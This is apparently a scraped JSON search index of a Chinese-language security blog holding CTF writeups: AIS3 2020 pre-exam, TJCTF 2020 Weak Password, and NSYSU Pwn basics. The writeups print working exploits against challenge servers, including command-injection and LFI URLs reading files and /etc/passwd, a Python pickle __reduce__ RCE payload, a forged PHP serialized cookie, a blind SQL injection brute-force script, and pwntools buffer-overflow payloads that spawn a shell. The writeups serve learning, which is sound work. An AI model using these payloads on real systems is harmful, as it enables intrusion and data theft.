Security"],"content":"Pwn 部分題目需要召喚 @stavhaygn (`・ω・´) ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:4:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"👻 BOF (100 points, 189 solves) Description （待補） Solution （待補） ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:4:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Crypto ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:5:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🦕 Brontosaurus (100 points, 380 solves) Description 題目給了一份字數多達42k的純文字檔 HERE，以下僅節錄開頭一部分。olution 事後發現題目同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。 不過當下其實就看得出是 JSFuck（被身邊朋友荼毒過了Zzzzz），只是直接複製到 jsfuck decoder 會失敗，正當我覺得納悶的時候才發現字首是 )，索性開 python 做字串反轉 [::-1] ，再一次 decode 就有 flag 了~ P.S. 事後和沒有參加 pre-exam 的朋友分享才被點出檔名 “KcufSJ” 就提示要反轉了XD ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:5:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🦖 T-Rex (100 points, 381 solves) Description 題目同樣給了一份純文字檔 HERE，而且也不難看出上半部和下半部之間的關聯。 ! @ # $ % \u0026 ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N \u0026 U Z 8 R D O \u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ } Solution 簡單講就是查表回推 flag，只是在群組真的聽到不少人直接用紙筆硬推（而且還推歪），怕爆。 既然都身為資訊科系寫個程式不為過吧 XDDDD #include \u003cbits/stdc++.h\u003e using namespace std; int main(){ map\u003cchar, int\u003e dict = { {'!',0}, {'@',1}, {'#',2}, {'$',3}, {'%',4}, {'\u0026',5} }; string table[6] = {\"VFYJ61\", \"50M29L\", \"IWHS4Q\", \"KGBXTA\", \"E3C7PN\", \"UZ8RDO\"}; stringstream ss(\"\u0026$ !# $# @% { %$ #! $\u0026 %# \u0026% \u0026% @@ $# %# !\u0026 $\u0026 !\u0026 !@ _ $\u0026 @% $$ _ @$ !# !! @% _ #! @@ !\u0026 _ $# \u0026\u0026 #@ !% %$ ## !# \u0026% @$ _ $\u0026 \u0026$ \u0026% %\u0026 \u0026\u0026 #@ _ !@ %$ %\u0026 %! $$ \u0026# !# !! \u0026% @% ## $% !% !\u0026 @! #\u0026 \u0026\u0026 %\u0026 !% %$ %# %$ @% ## %@ @@ $% ## !\u0026 #% %! %@ \u0026@ %! \u0026@ %$ $# ## %# !$ \u0026% @% !% !\u0026 $\u0026 \u0026% %# %@ #$ !# \u0026\u0026 !\u0026 #! %! ## #$ @! #% !! $! $\u0026 @\u0026 %% @@ \u0026\u0026 #\u0026 @% @! @# #@ @@ @\u0026 !@ %@ !# !# $# $! !@ \u0026$ $@ !! @! \u0026# @$ \u0026! \u0026# $! @@ \u0026@ !% #% #! \u0026@ \u0026$ @@ \u0026$ \u0026! !\u0026 #! !# ## %$ !# !# %$ \u0026! !# @# ## @@ $! $$ %# %$ @% @\u0026 $! \u0026! !$ $# #$ $\u0026 #@ %@ @$ !% %\u0026 %! @% #% $! !! #$ \u0026# ## \u0026# \u0026\u0026 $\u0026 !! !% $! @\u0026 !% \u0026@ !\u0026 $! @# !@ !\u0026 @$ $% #\u0026 #$ %@ %% %% \u0026! $# !# $\u0026 #@ \u0026! !# @! !@ @@ @@ ## !@ $@ !\u0026 $# %\u0026 %% !# !! $\u0026 !$ $% !! @$ @\u0026 !\u0026 \u0026@ #$ \u0026\u0026 @% $\u0026 $\u0026 !% \u0026! \u0026\u0026 \u0026@ \u0026% @$ \u0026% \u0026$ \u0026@ $$ }\"); string s; while( getline(ss, s, ' ') ){ if(s.length() == 1) cout \u003c\u003c s; else cout \u003c\u003c table[ dict[s[1]] ][ dict[s[0]] ]; } return 0; } 看看這充滿惡意的flag… 根本就沒打算讓人用手推XDDDDD AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX} ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:5:2","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Web ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:6:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🦈 Shark (100 points, 261 solves) Description 打開畫面後有個連結 Shark never cries? ，點開如下。 Solution 題目幾乎同去年 AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。 雖說如此，我在 Day 1 戳半天戳不出結果，到 Day 2 才發現考古題這件事 XD 首先，從連結的後綴可以觀察到 ?path=hint.txt，基本上可以聯想到 LFI 相關的題型，透過幾個基本的 php://filter 嘗試撈出 source code，例如 php://filter/convert.base64-encode/resource=index.php，把拿到的 base64 還原可以得到下面code。 \u003c?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('\u003cpre\u003e[forbidden]\u003c/pre\u003e'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('\u003cpre\u003e' . ($content ? htmlentities($content) : '[empty]') . '\u003c/pre\u003e'); } ?\u003e \u003c!DOCTYPE html\u003e \u003chead\u003e \u003ctitle\u003e🦈🦈🦈\u003c/title\u003e \u003cmeta charset=\"utf-8\"\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003e🦈🦈🦈\u003c/h1\u003e \u003ca href=\"?path=hint.txt\"\u003eShark never cries?\u003c/a\u003e \u003c/body\u003e 不過看起來沒有我們想要的資訊，只知道檔了很多存取目錄的方式，而確定 php://filter 方法可行。 再來就是題目一開始給的提示 “Please find the other server in the internal network! (flag is on that server)” ，那就來翻翻看 /etc/hosts… 不過沒有我們要的資訊。 Day 1 我就卡在這裡，直到找到去年 writeup 才發現有 /proc/net/fib_trie 可查到內網的 IP 位址。 Main: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 /32 link BROADCAST /8 host LOCAL |-- 127.0.0.1 /32 host LOCAL |-- 127.255.255.255 /32 link BROADCAST +-- 172.22.0.0/16 2 0 2 +-- 172.22.0.0/30 2 0 2 |-- 172.22.0.0 /32 link BROADCAST /16 link UNICAST |-- 172.22.0.3 \u003c--- WE ARE HERE /32 host LOCAL |-- 172.22.255.255 /32 link BROADCAST Local: +-- 0.0.0.0/0 3 0 5 |-- 0.0.0.0 /0 universe UNICAST +-- 127.0.0.0/8 2 0 2 +-- 127.0.0.0/31 1 0 0 |-- 127.0.0.0 之後就照著 writeup 走，找找 172.22.0.3 附近的 IP，例如 172.22.0.2。 最後直接 ?path=http://172.22.0.2/flag 就能拿 flag 了 ~ ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:6:1","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🐿 Squirrel (Post-solved, 100 points, 220 solves) Description 點進連結，畫面就是一堆松鼠帶著系統目錄跑來跑去… P.S. 題外話，同樣用 Chrome 但不同系統看的 emoji 都不太一樣蠻有趣的www Solution 解題人數明明破 200 位，但直到競賽結尾我還是沒解出來，事後證明我想太多了 QwQ 首先，從網頁source code可以看到些許端倪。 透過網址後綴 /api.php?get=/etc/passwd 可以撈到一些資訊，但這題看起來是沒什麼用。 基本上賽中我這裡就卡住了，一直想從網頁 source code 的 Error Handling 下手 … 其實，仔細想一下就可以發現，?get= + file name 能夠查看檔案內容… 那就不就是command cat嗎!!!! 既然如此，那來看看cat api.php應該也沒有問題吧! 透過網址後綴 /api.php?get=api.php 還真的把 api.php source code 撈出來了XD 從這份 source code 可以看到是用 shell_exec 執行指令，並且用 ' 前後閉合起來。 那我們下一步就能利用 command injection 的 ; 截斷執行我們想要的command ~ 例如 /api.php?get=';ls'，另外要記得要加上 ' 將前後閉合 （同SQLi的概念）。 能夠列出當前目錄，那就能繼續深入找找是否有些好玩的東西(?) 例如 /api.php?get=';ls ../../../' 好像… 有個可疑的檔案？ 嘿嘿那就來看看裡面有沒有flag吧！ 開心使用 /api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt'，有了!!! 不過打了這麼長一串… 是不是忘記那個 ?get= 其實就等同 cat 功能 www 直接在後面接目錄檔名就行了 /api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:6:2","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🐘 Elephant (168 points, 165 solves) Description 點進連結，可以看到是個登入頁面（還有需要反白的彩蛋??） 隨意輸入後，下方說明文字說明token不足以讀flag（同樣有需要反白的彩蛋??） Solution 這題當初真的是超乎預期地通靈拿到 flag，完全不明白考點在哪 == Quote 「所以才說有些題目就是知識斷片，才要用通靈的方式跳上去」 by 逆逆 因此賽後找了 @stavhaygn 完整還原一下這題的重點。 首先簡單講個人的通靈解法 XD 登入後可以把 cookies 的字串拿去 base64 decode 得到下列字串。 O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";s:32:\"6cdc79ae4ac3bd4ade8162dc68d2d50d\";} 格式上看得出是 type:length:data ，但我發現中間的 s:11:\"Usertoken\"… 算算長度應該是 9 吧(?) 嗯。我就真的手動改成 s:9:\"Usertoken\" 再 base64 encode 後填回去 cookies，重新整理頁面後就噴 flag 了…(黑人問號) 其實上面的字串格式叫做「序列化(serialization)」，我平常沒什麼摸真的不太瞭解 www 正確的作法應該是從 /.git ，可以發現並非 404 not found 而是 403 forbidden。 利用GitHack，把檔案還原出來。 \u003c?php const SESSION = 'elephant_user'; $flag = file_get_contents('/flag'); class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-\u003etoken) == 0; } } if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit; } $user = NULL; if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit; } else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data)); } 這份source code有幾個重點: line 8 token 的類別定義為 private (稍後會提到) line 11 token 產生的方式為 Random + MD5 Hash line 14 拿 flag 的條件: $flag == $this-\u003etoken line 28 serialize function 這題關鍵在 strcmp bypass 。而 $flag 寫在後端無法修改，我們也沒辦法控制 token 的 random 值。 從網路找的資訊為 strcmp 在遇到字串和陣列比較時將回傳 NULL，利用 PHP 的弱型別特性 NULL == 0 會成立。 那我們不就只要把拿到的序列化字串手動修改不就行了嗎 ~ O:4:\"User\":2:{s:4:\"name\";s:4:\"haha\";s:11:\"Usertoken\";a:0:{};} 很遺憾… 不行。如果改完再 encode 貼到 cookies 會被登出。 問題在於一些程式產生的不可視字元，同時也是我一開始發現字串長度很奇怪的部分。 關於PHP序列化格式，可以參考這篇 一文让PHP反序列化从入门到进阶，其中類別中的三種權限的表示方式: public: data private: %00class name%00member name protected: %00*%00member name 也能夠說明為何我看到的字串長度少 2（%00 * 2），同時也無法直接修改。 那這些看不見的字元自然不能被手動複製貼上，那怎麼辦哩？ … 既然是由程式產生的，那就寫回去吧。 可以直接照搬上面的產生 serialize 的程式碼，再將原本 token 產生的方式改成 array 即可！ \u003c?php class User { public $name; private $token; function __construct($name) { $this-\u003ename = $name; $this-\u003etoken = array(); } } $user = new User(\"haha\"); echo base64_encode(serialize($user)); 用 PHP online 之類的執行完就能把拿到的 base64 code 貼回去 cookies，重新整理頁面拿 flag ~ ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:6:3","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"🐍 Snake (Post-solved, 272 points, 137 solves) Description 點開連結，題目直接把code以純文字顯示在頁面上。 from flask import Flask, Response, request import pickle, base64, traceback Response.default_mimetype = 'text/plain' app = Flask(__name__) @app.route(\"/\") def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() Solution 簡單瞭解這份code: line 10 表示我們可以透過後綴 /?data= 接一些字串 line 14 表示字串必須為 base64 格式 line 15 pickle … ? 原來是肚子餓的部分（X） line 17 永遠不可能成立的條件 用 Google 搜尋 “pickle ctf” 可以找到不少資料，可以參考這篇 pickle反序列化初探。 簡單講 pickle 是 python 用來序列化及反序列化的 Python library。 當我們透過網址傳送序列化字串後， Server 端會執行反序列化並執行物件中的 __reduce__ ，因此我們這次將 __reduce__ 內容設計成system read /flag file， Server 回傳的就會是 flag 的內容，另外要注意的是回傳格式(callable, tuple)，後者的參數會交給前者執行。 import pickle import base64 class test(object): def __reduce__(self): return( eval, (\"open('/flag').read()\",) ) print(base64.b64encode(pickle.dumps(test()))) 剩下就是把產生出來的 base64 code 丟到網址後綴拿 flag ~ /?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg== ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:6:4","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Scoreboard ","date":"2020-06-30","objectID":"/posts/2020/ais3-2020-preexam-writeups/:7:0","tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam ","uri":"/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["資訊安全 Cyber Security"],"content":"Writeups 搬自 MacacaHub TJCTF 2020 Writeups 這題雖然叫 Weak Password ，但我當時遇到真的戳不出來呢 ; w ; 最後賽後隊友提點才知道原來是 Blind SQL injection ，平常我只拿' or 1=1 -- 戳戳根本是小兒科ww ","date":"2020-05-29","objectID":"/posts/2020/tjctf-2020-weakpassword/:0:0","tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/posts/2020/tjctf-2020-weakpassword/"},{"categories":["資訊安全 Cyber Security"],"content":"Description It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this [site] (https://weak_password.tjctf.org/). He’s told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{…}) ","date":"2020-05-29","objectID":"/posts/2020/tjctf-2020-weakpassword/:1:0","tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/posts/2020/tjctf-2020-weakpassword/"},{"categories":["資訊安全 Cyber Security"],"content":"Solution 標題同樣為 Weak Password ，T 貓盃只有 admin:admin ，這裡反而沒有這麼簡單XD 從題目給定 username 為 admin，以及從原始碼可以看到 SQL 語法以及一些欄位資訊，我們可以猜到這題要用 Blind SQL injection ，一些基本的猜法可以參考[SQL Injection(Blind)(SQL盲注)] (https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0)，當然也可以從網頁把 password 每個字元慢慢猜出來，但身為未來工程屍… 還是寫個Code吧 : ) How to Guess ? 透過SQL injection並利用登入結果判斷是否成功，想辦法從username撈出我們想要的資訊。 例如，猜password長度： admin' and length(password) \u003e 13 -- –\u003e success admin' and length(password) \u003e 14 -- –\u003e fail admin' and length(password) = 14 -- –\u003e success 可以猜到password長度為14。 又例如，猜password第一個字元： admin' and unicode(substr(password, 1)) \u003e unicode('a') -- –\u003e success admin' and unicode(substr(password, 1)) \u003e unicode('b') -- –\u003e fail admin' and unicode(substr(password, 1)) = unicode('b') -- –\u003e success 可以猜到password第一個字元為b。 再來就是寫Code了，可以搭配 Binary search 加速搜尋，然後利用回傳的 request 長度判斷結果是否成功。 import requests import string # Send request and get result def inject(n, opr, char): url = 'https://weak_password.tjctf.org/login' payload = {\"username\": \"admin' and unicode(substr(password, {})) \\\\ {} unicode('{}')-- \".format(n, opr,char), \"password\": \"123\"} r = requests.post(url, data=payload) return True if len(r.text)==1842 else False #1842:success res = \"\" li = list(string.digits + string.ascii_lowercase) for i in range(1, 20): l = 0 r = len(li) - 1 # end up binary search if it can't checkout any character if inject(i, '\u003e', li[0]) == False: print('password: ' + res) break while l \u003c= r: mid = (l + (r + 1)) // 2 #print(l, r, mid) if inject(i, '=', li[mid]): res = res + li[mid] break elif inject(i, '\u003e', li[mid]): l = mid elif inject(i, '\u003c', li[mid]): r = mid else: break print(res) ","date":"2020-05-29","objectID":"/posts/2020/tjctf-2020-weakpassword/:2:0","tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/posts/2020/tjctf-2020-weakpassword/"},{"categories":["資訊安全 Cyber Security"],"content":"Result ","date":"2020-05-29","objectID":"/posts/2020/tjctf-2020-weakpassword/:2:1","tags":["TJCTF","Web Security","CTF-Writeup"],"title":"[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)","uri":"/posts/2020/tjctf-2020-weakpassword/"},{"categories":["資訊安全 Cyber Security"],"content":"經歷大約一學期的 CTF 洗禮，總算是對這分面稍微有些概念 : D 原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 作為第一篇 writeup，決定拿社課的習題練練手，一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考。另外就是可以給非資安背景的朋友簡單認識一下 Pwn ，否則每次被問到我也不曉得怎麼解釋（抹臉） hmmm 不會解釋資安… 應該是我的問題才對Orz “Pwn” 有人唸 Costco、有人唸 IKEA，總之我都唸\"胖“或是”碰\"。常見做法就是針對程式內的漏洞進行攻擊（提權），有種 “player has been owned.” 的意思。 也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺～ 在CTF領域，Pwn 基礎題通常是給你讀取的無權限文字檔，希望你透過程式漏洞拿到 root 權限拿 flag。 以我來說，平常剛拿到題目比較會用到的幾個指令。 ls -al 瞭解目錄下的檔案以及執行權限 file 確認檔案類型以及位元數 checksec 查看該ELF檔開啟了哪些保護機制 那接下來就開始解題囉！ovo ","date":"2020-03-22","objectID":"/posts/2020/nsysuisc-pwn-01/:0:0","tags":["NSYSUISC 中山資安社","Pwn Challenge"],"title":"[NSYSU 資安社課] Pwn Basic #1","uri":"/posts/2020/nsysuisc-pwn-01/"},{"categories":["資訊安全 Cyber Security"],"content":"0x01: Password 首先，來看一下這題提供的檔案。 password password.c flag.txt 第一個檔案 password 用 file 指令可以查看關於password的檔案類型。 $ file ./password password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped 可以發現是屬於 Linux 底下的 ELF 執行檔，也是 CTF 內最常見的檔案類型，不過用 MacOS 的 Safari 載下來都會莫名被加上.dms，當時第一次看到還在思考檔案是不是壞了XD（用 file 查看是沒有問題），另外社課提供的 Pwn 基礎題以 32-bits 為主，比起 64-bits 相對單純方便教學。 再來就是直接執行看看… 咦？不能執行？ 用 ls 發現這個檔案並沒有執行權限，可以用 chmod 改檔案權限。對其他細節有興趣的可以瞭解一下 鳥哥私房菜 - Linux的檔案權限與目錄配置。 $ ls -al -rw-r-xr-x@ [other information] password $ chmod +x ./password $ ls -al -rwxr-xr-x@ [other information] password 修改完執行權限後可以先run一下看看程式大概要幹嘛。 在Pwn基礎題通常會刻意把一些防禦機制關掉，可以拿 checksec 指令看看該執行檔開了哪些保護，以password這題來說。 $ checksec ./password Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 第一次見到這些保護機制看不懂很正常，簡單講就是 RELRO 暫時還不會用到，主要適用於防範 lazy Binding 所造成的延伸問題 Stack 的 canary 關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能 Buffer Overflow NX 開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習 PIE 關閉讓你分析執行檔時看到的會是\"絕對位址\"，若開啟就只看得到位址偏移量不容易拿來利用 P.S. 另外還有一個沒出現在 checksec 的 ASLR ，主要是對於每次執行 stack 、heap … etc. 的位址隨機化，避免攻擊者可以定位記憶體位址 之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。 然後，社課的基礎題還順便附了該執行程式的原始碼，╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯ int main() { ... char password[12] = \"12345678\"; char name[8]; printf(\"What's your name? \"); gets(name); printf(\"Hello %s\\n\", name); if (!strcmp(password, \"password\")) { puts(\"Welcome :) \"); shell(); return 0; } printf(\"QQ %s\\n\", password); exit(0); } 這段 code 對於有寫過程式的各位應該都不困難。 題意要求輸入 name ，然後會拿變數 password 和 “password” 進行比較，判斷式成立就能執行 shell()，可以發現當中並沒有任何要求輸入變數password，只有在最後會輸出 “QQ password\"，若第一次接觸 Pwn 的看到這奇怪的判斷式應該會滿頭問號。 不過，我們可以先隨便輸入一些東西觀察看看，像是變數 name 大小為 8 bytes，輸入 “12345678”，會得到下面結果。 $ What's your name? 12345678 $ Hello 12345678 QQ Segmentation fault 然而，如果輸入超過 8 bytes “1234567890”，會得到下列結果。 $ What's your name? 1234567890 $ Hello 1234567890 QQ 90 Segmentation fault 嗯嗯？明明沒有對變數 password 輸入參數，但變數內容好像被偷改了XD 沒錯！這題主要想表達的事情是： Note gets() 這輸入函式是不安全的，因為它不會限制使用者的輸入長度。 因此若在沒有 canary 的情況下很容易遭受 Buffer Overflow 攻擊！ 以這題來說我們可以用反組譯指令 objdump 瞭解一下程式架構 $ objdump -d -M intel ./password Stack內容的部分畫成圖大概長得像這樣 我們這次輸入改成 “aaaaaaaahaha” ， “haha” 就會蓋到變數 password 的值了。 聰明的你應該知道怎麼做了吧 (｡･ω･｡) 沒有錯的啦！將上面的 “haha” 改成 “password” 就能啟動 shell() 拿到 root 權限了！ 話說回來，往後能夠透過手動輸入就破解的 Pwn 題並不常見，因此這類型的題目通常會搭配 Python 套件 pwntool 進行 exploit。 ↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓ from pwn import * # process:本機連線, remote:遠端連線 conn = process('./password') # 根據程式內容設計輸入(payload) payload = '12345678password' print(payload) # 傳送給程式後, 由於會執行shell需要用interactive()進行互動 conn.sendline(payload) conn.interactive() 光是第一題就寫了落落長… 打 Pwn 一開始抓不到感覺還蠻正常，所以我希望能用step by step的方式解釋詳細一點，順便幫自己補充平常不太會深入的知識。 ","date":"2020-03-22","objectID":"/posts/2020/nsysuisc-pwn-01/:1:0","tags":["NSYSUISC 中山資安社","Pwn Challenge"],"title":"[NSYSU 資安社課] Pwn Basic #1","uri":"/posts/2020/nsysuisc-pwn-01/"},{"categories":["資訊安全 Cyber Security"],"content":"0x02: BOF 這題給的檔案有 bof bof.c flag.txt 同樣 flag 沒有讀取權限，我們一樣來看看 bof 執行檔有開了哪些保護。 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 唔嗯… 可以發現和上一題形式上十分類似，再來看看bof.c原始碼的內容 void shell() { system(\"/bin/sh\"); } void vuln() { char str[48]; printf(\"Input: \"); gets(str); return; } int main() { ... vuln(); return 0; } 整體結構看起來和上一題沒什麼差別，也都是針對 gets() 的危險漏洞，只是這次… 完全沒辦法執行 shell() !!! 這題主要想表達的事情是： Note 利用 gets() 不限輸入長度的漏洞進行 Buffer Overflow。 而且要把 vuln() 原本要回到 main() 的 return address 改成 shell() 的 address。 嗯… 蛤!? ・ ࡇ ・ 我相信有學過 OS 的同學大概都不陌生，只是懂歸懂，但要怎麼做呢？ 一樣先拿 objdump 一樣來看看裡頭長什麼樣子。 $ objdump -d -M intel ./bof 080484eb \u003cshell\u003e: 80484eb: 55 push ebp 80484ec: 89 e5 mov ebp,esp 80484ee: 68 e0 85 04 08 push 0x80485e0 80484f3: e8 b8 fe ff ff call 80483b0 \u003csystem@plt\u003e 80484f8: 83 c4 04 add esp,0x4 80484fb: 90 nop 80484fc: c9 leave 80484fd: c3 ret 080484fe \u003cvuln\u003e: 80484fe: 55 push ebp 80484ff: 89 e5 mov ebp,esp 8048501: 83 ec 30 sub esp,0x30 8048504: 68 e8 85 04 08 push 0x80485e8 8048509: e8 82 fe ff ff call 8048390 \u003cprintf@plt\u003e 804850e: 83 c4 04 add esp,0x4 8048511: 8d 45 d0 lea eax,[ebp-0x30] 8048514: 50 push eax 8048515: e8 86 fe ff ff call 80483a0 \u003cgets@plt\u003e 804851a: 83 c4 04 add esp,0x4 804851d: 90 nop 804851e: c9 leave 804851f: c3 ret 重點在 line 18 的 ebp-0x30 ，必須要掌握變數所在的相對位置，我們把 stack frame 畫成圖大概就是下面這樣 ↓↓↓ 也就是說，這題希望我們除了把str[48]填滿 還要利用Buffer Overflow的方式把shell()的address蓋到return上。 再來就是要知道line 1 shell()的function address 假如我們通通用\"a\"進行覆蓋，預期結果將會長這樣：） 既然知道要怎麼蓋return address，剩下的就是寫payload了。 from pwn import * conn = process('./bof') # payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address # 要注意由於32位元是little-endian, 所以要用p32()轉成\\xeb\\x84\\x04\\x08的格式 payload = 'a'*48 + 'aaaa' + p32(0x080484eb) print(payload) conn.sendline(payload) conn.interactive() 這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD $ (python -c \"print('a'*48 + 'a'*4 + '\\xeb\\x84\\x04\\x08')\"; cat) | ./bof 大概就是這麼一回事了~ 寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了QQ 就醬，希望我還能繼續把題目補完（逃 ","date":"2020-03-22","objectID":"/posts/2020/nsysuisc-pwn-01/:2:0","tags":["NSYSUISC 中山資安社","Pwn Challenge"],"title":"[NSYSU 資安社課] Pwn Basic #1","uri":"/posts/2020/nsysuisc-pwn-01/"},{"categories":["資訊安全 Cyber Security"],"content":" 久違的文章，稍稍整理一下長灰塵的部落格（笑） 在資安實驗室也不知不覺待了三個月… 而這次的金盾獎是我第一個接觸的資安現場賽！ 